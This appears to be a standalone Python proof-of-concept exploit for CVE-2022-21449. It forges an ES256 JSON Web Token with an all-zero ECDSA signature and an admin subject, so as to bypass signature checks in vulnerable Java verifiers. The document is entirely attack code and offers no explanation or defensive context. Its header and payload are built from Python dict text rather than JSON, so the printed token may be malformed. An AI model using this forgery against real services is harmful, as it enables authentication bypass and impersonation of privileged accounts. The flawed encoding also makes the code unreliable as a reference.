# CVE-2022-21449 JWT Bypass

from ecdsa.ecdsa import Signature
from ecdsa.util import sigencode_der

import base64

sig = Signature(0,0)

result = sigencode_der(0,0,1)
signature = str(base64.urlsafe_b64encode(result),"utf-8").rstrip("=")
# print(signature)


header = {"alg": "ES256"}
payload = {"sub": "admin@libcurl.so"}


encoded_header = str(base64.urlsafe_b64encode(bytes(str(header), 'utf-8')).rstrip(b'='),'utf-8')
encoded_payload = str(base64.urlsafe_b64encode(bytes(str(payload), 'utf-8')).rstrip(b'='),'utf-8')


token = encoded_header+"."+encoded_payload+"."+signature
print(token)
